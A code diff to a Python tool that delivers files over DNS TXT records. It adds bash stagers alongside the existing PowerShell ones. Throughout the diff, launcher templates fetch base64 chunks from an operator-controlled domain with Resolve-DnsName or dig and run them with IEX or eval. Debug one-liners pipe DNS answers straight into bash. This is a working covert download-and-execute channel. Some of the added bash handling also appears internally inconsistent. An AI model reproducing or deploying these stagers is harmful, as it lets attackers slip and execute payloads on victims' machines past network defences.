@@ -46,7 +46,7 @@ def signal_handler(signal, frame):
     log('Exiting...')
     sys.exit(0)
 
-def dns_handler(data):
+def dns_handler(data, target):
     # only process dns queries
     if data.haslayer(IP) and data.haslayer(UDP) and data.haslayer(DNS) and data.haslayer(DNSQR):
         # split packet layers
@@ -63,9 +63,8 @@ def dns_handler(data):
             # remove domain part of fqdn and split the different parts of hostname
             hostname = re.sub(r'\.%s\.$' % re.escape(args.domain), '', dnsqr.qname.decode()).split('.')
 
-            # check if hostname match existing file
+            # check if hostname matches an existing file
             if len(hostname) > 0 and hostname[0] in chunks:
-
                 # launcher response (default): file.domain
                 if len(hostname) == 1:
                     hostname.append('print')
@@ -73,6 +72,10 @@ def dns_handler(data):
                 # launcher response: file.stager.domain
                 if len(hostname) == 2 and hostname[1] in ['print', 'exec', 'save']:
                     response = launcher_template % (len(stagers[hostname[0]][hostname[1]]), hostname[0], hostname[1], args.domain)
+                     # Base64 encode the response for the bash target
+                    if target == 'bash':
+                        response = "echo " + base64.b64encode(response.encode()).decode() + " | base64 -d"
+
                     log('Delivering %s %s launcher to %s' % (hostname[0], hostname[1], ip.src), '+')
 
                 # stager response: file.stager.i.domain
@@ -86,6 +89,7 @@ def dns_handler(data):
                     log('Delivering %s chunk %s/%d to %s' % (hostname[0], int(hostname[1]), len(chunks[hostname[0]]), ip.src), '+')
 
                 else:
+                    log(f"Hostname '{hostname}' did not match expected patterns for target '{target}'", 'debug')
                     return
 
                 # build response packet
@@ -107,6 +111,7 @@ if __name__ == '__main__':
     parser.add_argument('-p', '--path', default='.', help='path of directory to serve over DNS (default: pwd)')
     parser.add_argument('-s', '--size', default='255', help='size in bytes of base64 chunks (default: 255)')
     parser.add_argument('-v', '--verbose', action='store_true', help='increase verbosity')
+    parser.add_argument('-t', '--target', choices=['powershell', 'bash'], default='powershell', help='target language for stagers (default: powershell)')
     args = parser.parse_args()
 
     print('%s' % banner)
@@ -129,16 +134,6 @@ if __name__ == '__main__':
         for name in files:
             filenames[name] = ''
         break
-
-    # launcher and stagers template definition
-
-    launcher_template = 'IEX([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String((1..%d|%%{Resolve-DnsName -ty TXT -na "%s.%s.$_.%s"|Where-Object Section -eq Answer|Select -Exp Strings}))))'
-
-    stager_templates = {
-        'print': '[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String((1..%d|%%{do{$error.clear();Write-Host "[*] Resolving chunk $_/%d";Resolve-DnsName -ty TXT -na "%s.$_.%s"|Where-Object Section -eq Answer|Select -Exp Strings}until($error.count-eq0)})))',
-        'exec': 'IEX([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String((1..%d|%%{do{$error.clear();Write-Host "[*] Resolving chunk $_/%d";Resolve-DnsName -ty TXT -na "%s.$_.%s"|Where-Object Section -eq Answer|Select -Exp Strings}until($error.count-eq0)}))))',
-        'save': '[IO.File]::WriteAllBytes("$(Get-Location)\\%s",[System.Convert]::FromBase64String((1..%d|%%{do{$error.clear();Write-Host "[*] Resolving chunk $_/%d";Resolve-DnsName -ty TXT -na "%s.$_.%s"|Where-Object Section -eq Answer|Select -Exp Strings}until($error.count-eq0)})))',
-    }
 
     # for each file, sanitize filename compute chunks and generate stagers (main file processing loop)
     chunks = {}
@@ -169,32 +164,87 @@ if __name__ == '__main__':
             log('Error computing base64 for %s, file will been ignored' % name, '-')
             continue
 
-        # generate stagers
-        stagers[filenames[name]] = {}
-        stagers[filenames[name]]['print'] = base64_chunks(bytearray(stager_templates['print'] % (len(chunks[filenames[name]]), len(chunks[filenames[name]]), filenames[name], args.domain), 'utf-8'), size)
-        stagers[filenames[name]]['exec'] = base64_chunks(bytearray(stager_templates['exec'] % (len(chunks[filenames[name]]), len(chunks[filenames[name]]), filenames[name], args.domain), 'utf-8'), size)
-        stagers[filenames[name]]['save'] = base64_chunks(bytearray(stager_templates['save'] % (name, len(chunks[filenames[name]]), len(chunks[filenames[name]]), filenames[name], args.domain), 'utf-8'), size)
+        if args.target == 'powershell':
 
-        # display file ready for delivery
-        log('File "%s" ready for delivery at %s.%s (%d chunks)' % (name, filenames[name], args.domain, len(chunks[filenames[name]])))
+            # launcher and stagers template definition
 
-        # Print lookup template for each type exec, print, and save
-        lookup_templates_pwsh = {
-            'print': "Resolve-DnsName -ty TXT -na \"%s.print.%s\" | Select-Object -Exp Strings",
-            'exec': "Resolve-DnsName -ty TXT -na \"%s.exec.%s\" | Select-Object -Exp Strings",
-            'save': "Resolve-DnsName -ty TXT -na \"%s.save.%s\" | Select-Object -Exp Strings"
-        }
+            launcher_template = 'IEX([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String((1..%d|%%{Resolve-DnsName -ty TXT -na "%s.%s.$_.%s"|Where-Object Section -eq Answer|Select -Exp Strings}))))'
 
-        lookup_templates_nslookup = {
-            'print': "nslookup -q=TXT %s.print.%s %s",
-            'exec': "nslookup -q=TXT %s.exec.%s %s",
-            'save': "nslookup -q=TXT %s.save.%s %s"
-        }
+            stager_templates = {
+                'print': '[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String((1..%d|%%{do{$error.clear();Write-Host "[*] Resolving chunk $_/%d";Resolve-DnsName -ty TXT -na "%s.$_.%s"|Where-Object Section -eq Answer|Select -Exp Strings}until($error.count-eq0)})))',
+                'exec': 'IEX([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String((1..%d|%%{do{$error.clear();Write-Host "[*] Resolving chunk $_/%d";Resolve-DnsName -ty TXT -na "%s.$_.%s"|Where-Object Section -eq Answer|Select -Exp Strings}until($error.count-eq0)}))))',
+                'save': '[IO.File]::WriteAllBytes("$(Get-Location)\\%s",[System.Convert]::FromBase64String((1..%d|%%{do{$error.clear();Write-Host "[*] Resolving chunk $_/%d";Resolve-DnsName -ty TXT -na "%s.$_.%s"|Where-Object Section -eq Answer|Select -Exp Strings}until($error.count-eq0)})))'
+            }
 
-        for key in lookup_templates_pwsh:
-            log('Lookup %s (Resolve-DNSName): %s' % (key.upper(), lookup_templates_pwsh[key] % (filenames[name], args.domain)), 'debug')
-            log('Lookup %s (nslookup): %s' % (key.upper(), lookup_templates_nslookup[key] % (filenames[name], args.domain, args.nameserver)), 'debug')
-        
+            # generate stagers
+            stagers[filenames[name]] = {}
+            stagers[filenames[name]]['print'] = base64_chunks(bytearray(stager_templates['print'] % (len(chunks[filenames[name]]), len(chunks[filenames[name]]), filenames[name], args.domain), 'utf-8'), size)
+            stagers[filenames[name]]['exec'] = base64_chunks(bytearray(stager_templates['exec'] % (len(chunks[filenames[name]]), len(chunks[filenames[name]]), filenames[name], args.domain), 'utf-8'), size)
+            stagers[filenames[name]]['save'] = base64_chunks(bytearray(stager_templates['save'] % (name, len(chunks[filenames[name]]), len(chunks[filenames[name]]), filenames[name], args.domain), 'utf-8'), size)
+
+            # display file ready for delivery
+            log('File "%s" ready for delivery at %s.%s (%d chunks)' % (name, filenames[name], args.domain, len(chunks[filenames[name]])))
+
+            # Print lookup template for each type exec, print, and save
+            lookup_templates_pwsh = {
+                'print': "Resolve-DnsName -ty TXT -na \"%s.print.%s\" | Select-Object -Exp Strings",
+                'exec': "Resolve-DnsName -ty TXT -na \"%s.exec.%s\" | Select-Object -Exp Strings",
+                'save': "Resolve-DnsName -ty TXT -na \"%s.save.%s\" | Select-Object -Exp Strings"
+            }
+
+            lookup_templates_nslookup = {
+                'print': "nslookup -q=TXT %s.print.%s %s",
+                'exec': "nslookup -q=TXT %s.exec.%s %s",
+                'save': "nslookup -q=TXT %s.save.%s %s"
+            }
+
+            for key in lookup_templates_pwsh:
+                log('Lookup %s (Resolve-DNSName): %s' % (key.upper(), lookup_templates_pwsh[key] % (filenames[name], args.domain)), 'debug')
+                log('Lookup %s (nslookup): %s' % (key.upper(), lookup_templates_nslookup[key] % (filenames[name], args.domain, args.nameserver)), 'debug')
+
+        elif args.target == 'bash':
+            # launcher and stagers template definition for bash
+            launcher_template = 'eval $(echo $(for i in $(seq 1 %d); do dig +short %s.%s.$i.%s TXT | tr -d "\\n"; done) | tr -d "\\"" | base64 -d)'
+
+            stager_templates = {
+                'print': 'echo $(for i in $(seq 1 %d); do dig +short %s.$i.%s TXT | tr -d "\\n"; done) | tr -d "\\"" | base64 -d',
+                'exec': 'eval $(echo $(for i in $(seq 1 %d); do dig +short %s.$i.%s TXT | tr -d "\\n"; done) | tr -d "\\"" | base64 -d)',
+                'save': 'echo $(for i in $(seq 1 %d); do dig +short %s.$i.%s TXT | tr -d "\\n"; done) | tr -d "\\"" | base64 -d > %s'
+            }
+
+            
+            stagers[filenames[name]] = {}
+            stagers[filenames[name]]['print'] = base64_chunks(bytearray(stager_templates['print'] % (len(chunks[filenames[name]]), filenames[name], args.domain), 'utf-8'), size)
+            stagers[filenames[name]]['exec'] = base64_chunks(bytearray(stager_templates['exec'] % (len(chunks[filenames[name]]), filenames[name], args.domain), 'utf-8'), size)
+            stagers[filenames[name]]['save'] = base64_chunks(bytearray(stager_templates['save'] % (len(chunks[filenames[name]]), filenames[name], args.domain, filenames[name]), 'utf-8'), size)
+
+            
+            # display file ready for delivery
+            log('File "%s" ready for delivery at %s.%s (%d chunks)' % (name, filenames[name], args.domain, len(chunks[filenames[name]])))
+
+            # Print lookup template for each type exec, print, and save
+            lookup_templates = {
+                'print': "dig +short -t txt %s.print.%s",
+                'exec': "dig +short -t txt %s.exec.%s",
+                'save': "dig +short -t txt %s.save.%s"
+            }
+
+            for key in lookup_templates:
+                log('Lookup %s: %s' % (key.upper(), lookup_templates[key] % (filenames[name], args.domain)), 'debug')
+
+
+            lookup_templates_oneliner = {
+                'print': "eval $(dig +short -t txt %s.print.%s |tr -d \"\\\"\" | bash)",
+                'exec': "eval $(dig +short -t txt %s.exec.%s |tr -d \"\\\"\" | bash)",
+                'save': "eval $(dig +short -t txt %s.save.%s |tr -d \"\\\"\" | bash)"
+            }
+
+            for key in lookup_templates_oneliner:
+                log('Lookup One-Liner %s: %s' % (key.upper(), lookup_templates_oneliner[key] % (filenames[name], args.domain)), 'debug')
+
+        else:
+            log('Unknown target %s' % args.target, '-')
+            sys.exit(-1)
 
     # register signal handler
     signal.signal(signal.SIGINT, signal_handler)
@@ -202,4 +252,4 @@ if __name__ == '__main__':
     # listen for DNS query
     log('Listening for DNS queries...')
 
-    sniff(filter='udp dst port 53', iface=args.interface, prn=dns_handler)
+    sniff(filter='udp dst port 53', iface=args.interface, prn=lambda data: dns_handler(data, args.target))
